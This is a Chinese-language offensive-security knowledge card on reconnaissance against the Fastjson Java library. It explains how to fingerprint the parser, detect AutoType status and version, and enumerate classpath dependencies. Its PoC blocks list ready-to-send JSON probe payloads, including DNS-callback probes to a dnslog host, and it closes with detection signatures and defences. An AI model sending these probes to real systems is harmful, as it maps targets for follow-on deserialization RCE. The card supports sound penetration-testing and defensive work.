---
id: web-java-deser-fastjson-recon-version-dependency-probe
title: Fastjson 识别与版本/依赖/期望类探测：解析指纹、AutoType 探测与 DNS 回显
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-recon-probing
aliases:
- Fastjson 判断
- Fastjson 版本探测
- Fastjson 依赖探测
- 期望类探测
- Fastjson vs Jackson
- Fastjson vs Gson
- Fastjson AutoType 探测
tags:
- java
- fastjson
- recon
- fingerprint
- version-detection
- dependency-detection
- expected-class
- dnslog
cve: []
severity: medium
confidence: medium
status: draft
created: '2026-11-04'
updated: '2026-11-04'
---

## 一句话结论

在打 Fastjson 前先用三类无/低副作用探测收敛目标：用解析器对畸形 JSON、单引号、注释符、`$ref`、浮点精度的差异识别 Fastjson 并区分 Jackson/Gson/org.json；用 `@type` 报错与 DNS 探测判断 AutoType 状态和大致版本；用 `Character` 强制转换报错、DNS 子域与期望类叠层探测确认依赖和反序列化入口类型。

## 原理

不同 JSON 库对同一输入的容错和归一化不同，这些差异会稳定反映在响应里：

- Fastjson 允许多余字段、单引号、`//` 注释、`\u0000`/`\x00` 等转义，且会把 `new a(1)`、`x'11'`、`Set[{}{}]` 解析成特定值；
- Jackson 对多余字段报错、不支持单引号、接受 `/*#` 注释、浮点会丢精度；
- Gson 接受 `#\r\n` 注释并丢浮点精度；
- org.json 对 `\r` 等特殊字符报 `Unterminated string`。

版本探测利用 `checkAutoType` 在不同版本对 `java.lang.Class`、`AutoCloseable`、特定异常类的处理差异；依赖探测利用 `java.lang.Character` 的强转：目标类存在时会报 `can not cast to char`，不存在时往往是通用错误/`No message available`。期望类探测利用带期望类时 `Feature`/`{{}:{}}` 会报错，而不带期望类时可正常解析。

## 触发条件

- 目标接受 JSON 请求体，错误信息/状态码/响应差异可观察；
- 目标可出网（DNS 探测）或至少能观察响应时间/状态码（不出网探测）；
- 攻击者能向目标发送任意 JSON 字段（不要求已能执行代码）。

## 利用步骤

1. **识别 Fastjson**：先发畸形 JSON 看报错文案；再发 `{"@type":"whatever"}` 看是否出现 `autoType is not support`；用单引号、`//` 注释、多余字段、浮点精度与 Jackson/Gson/org.json 对照。
2. **判断 AutoType**：
   - `{"xxx":{"@type":"java.lang.Class","val":""}}` 与 `{"xxx":{"@type":"Random.String"}}` 的报错组合；
   - `{"@type":"java.lang.AutoCloseable"}` 精确探测（1.2.76 之后结果会停在 1.2.76）；
   - `{"xxx":{"@type":"Test.TestException"}}` 仅 1.2.83 不报错。
3. **DNS 粗判版本**：用 `java.net.InetSocketAddress` 的 `val` 指向 dnslog，按 <=1.2.47 / <=1.2.68 / <=1.2.80 / 1.2.83 的不同嵌套 payload 观察命中次数。
4. **不出网版本判断**：根据 500/正常响应区分 1.2.83/1.2.24、1.2.25–1.2.80 等区间。
5. **依赖探测**：发 `{"x":{"@type":"java.lang.Character","C":{"@type":"java.lang.Class","val":"<class>"}}}`，响应含 `can not cast to char` 说明类存在；按 Spring/Tomcat/Groovy/C3P0/MyBatis/H2/MySQL/PostgreSQL/commons-io 等类名批量扫。
6. **期望类探测**：在原参数上叠 `{"@type":"com.alibaba.fastjson.support.geo.Feature",...}`；报错说明存在期望类；也可用 `{{}:{}}` 嵌入形式进一步确认。`Feature` 是 1.2.68 引入，可辅助判断版本。

## PoC

```text
# 识别
{"age":20,"name":"Bob"          // 缺右括号，看报错
{"@type":"whatever"}            // 看 autoType 报错
{"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"}
{"ext":"blue","name":{"$ref":"$.ext"}}

# 与 Jackson 区分
{"age":20,"name":"Bob","test":1}
{"age":20,'name':'Bob'}
{"age":20,"name":'Bob'}/*#aaaa

# 与 Gson 区分
{a:1.111111111111111111111111111}
#\r\n{a:1}

# 与 org.json 区分
{a:'\r'}
```

```text
# AutoType / 版本
{"xxx":{"@type":"java.lang.Class","val":""}}
{"xxx":{"@type":"Random.String"}}
{"@type":"java.lang.AutoCloseable"}
{"xxx":{"@type":"Test.TestException"}}

# 期望类
{"@type":"com.alibaba.fastjson.support.geo.Feature"}
{{}:{}}
{"test":{{}:{}},"username":"admin","password":"123456"}
```

```text
# 依赖探测（类存在 -> can not cast to char）
{"x":{"@type":"java.lang.Character","C":{"@type":"java.lang.Class","val":"org.springframework.web.bind.annotation.RequestMapping"}}}
```

常见依赖类：Spring `RequestMapping`、Tomcat `org.apache.catalina.startup.Tomcat`、Groovy `groovy.lang.GroovyShell`、C3P0 `com.mchange.v2.c3p0.DataSources`、MyBatis `UnpooledDataSource`/`Alias`、H2 `JdbcDataSource`、MySQL 5/6/8 驱动类、PostgreSQL `PgConnection`、commons-io 各版本特征类、AspectJ `Ajde`、Jackson `InputCoercionException`、Jython `ParseException`。

## 变体与关联

- DNS 版本探测存在误判：不同网络/版本组合可能只命中部分请求；应结合报错与依赖结果交叉验证。
- 1.2.76 之后 AutoCloseable 探测会停在 1.2.76，不能精确到更高版本；1.2.83 用 `Test.TestException` 单独确认。
- 期望类存在时，后续利用受 getter/`$ref` 限制，需改用 Currency 等绕法（见关联卡）。
- 关联：[[web-java-deser-fastjson-currency-getter-expected-class]]、[[web-java-deser-fastjson-resource-probing-rce]]、各版本 gadget 卡。

## 检测与防御

- 检测：请求体中出现 `@type`、`java.lang.Character`、`java.net.Inet4Address`、`AutoCloseable`、`Test.TestException`、`support.geo.Feature`、`{{}:{}}` 等探测特征；同一来源短时间内大量不同类名/子域的 JSON 请求。
- 防御：统一 JSON 错误文案，避免暴露解析器类型/版本；关闭 AutoType/SafeMode；对 `@type` 做白名单；限制出网 DNS；对异常 JSON 结构做速率限制。
- 注意：探测本身不产生危害，但它是后续 RCE 链的前置；不要因为“只是探测”而忽略。
